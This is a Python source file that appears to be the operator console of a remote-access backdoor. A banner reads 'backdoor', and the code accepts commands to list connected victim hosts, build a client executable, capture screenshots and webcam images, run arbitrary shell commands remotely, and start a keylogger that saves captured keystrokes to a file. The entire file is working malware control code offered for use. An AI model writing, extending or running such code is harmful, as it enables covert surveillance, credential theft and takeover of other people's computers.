from art import tprint
from generateapp import generateapp
from host import Host
from server import Server
from setting import setting
from commands import get_flags_as_table, get_commands_as_table, get_command_as_table, get_flag_as_table, get_flags
from prettytable import PrettyTable
from os import system
from setting import setting

class Terminal:

    def __init__(self) -> None:
        self.__server = Server(setting["host"], setting["port"])
        self.__server.start()
        self.__running = True

    def run(self):
        system("cls")
        tprint("backdoor"+"\n")
        print(">> Server has benn initilized. Input help to info")
        print()
        while self.__running:
            task = input(">> ").lower().strip()
            if task:
                print()

                flags = get_flags(task)
                task = flags.get("task")

                if task == "show hosts":
                    table_hosts = PrettyTable()
                    table_hosts.field_names = ["Id", "Host Name"]
                    table_hosts.add_rows([[host.id, host.name] for host in self.__server.hosts])
                    print(table_hosts.get_string())
                elif task == "close":
                    host = self.__server.get_host_by_id(flags.get("host")) if flags.get("host") else None
                    if host:
                        if not isinstance(host, Host):
                            print("Invalid Host.")
                        else:
                            self.__server.end(host)
                    else:
                        self.__server.end()
                        self.__running = False
                elif task == "help":
                    if flags.get("command"):
                        print(get_command_as_table(flags.get("command")))
                    if flags.get("flag"):
                        print(get_flag_as_table(flags.get("flag")))
                    else:
                        print(get_commands_as_table())
                        print()
                        print(get_flags_as_table())
                elif task == "generate app":
                    name = flags.get("name", setting["name_app_client"])
                    if not name.endswith(".exe"): name += ".exe"
                    generateapp(name)
                    
                else:
                    if flags.get("host"):
                        host = self.__server.get_host_by_id(flags.get("host"))
                        if isinstance(host, Host):
                            if task == "screenshot":
                                name = flags.get("name", f"{task}-{host.name}-{host.id}.png")
                                if not name.endswith(".png"): name += ".png"
                                print("Waiting data ...\n")
                                name = setting.get("path_server").joinpath(name).as_posix()
                                noerror, mssg = self.__server.screenshot(host, name)
                                if not noerror:
                                    print(mssg)

                            elif task == "camera":
                                name = flags.get("name", f"{task}-{host.name}-{host.id}.png") 
                                if not name.endswith(".png"): name += ".png"
                                print("Waiting data ...\n")
                                name = setting.get("path_server").joinpath(name).as_posix()
                                noerror, mssg = self.__server.camera(host, name)
                                if not noerror:
                                    print(mssg)

                            elif task == "cmd":
                                if flags.get("command"):
                                    print("Waiting data ...")
                                    noerror, result = self.__server.execute_in_terminal(host, flags.get("command"))
                                    print(result)
                                else:
                                    print("Missing --command flag")
                            elif task == "keylogger":
                                print("Waiting data ...")
                                time = flags.get("time") if flags.get("time") and flags.get("time").isdigit() and int(flags.get("time")) > 0 else "10"
                                noerror, result = self.__server.active_keylogger(host, time)
                                if noerror:
                                    with open(f"keylogger-{host.id}.txt", "w") as f:
                                        f.write(result)
                                else:
                                    print(result)

                            else:
                                print("Command not exist")
                        else:
                            print("Host not exist")
                    else:
                        print("You have add --host. See help")

            print()
            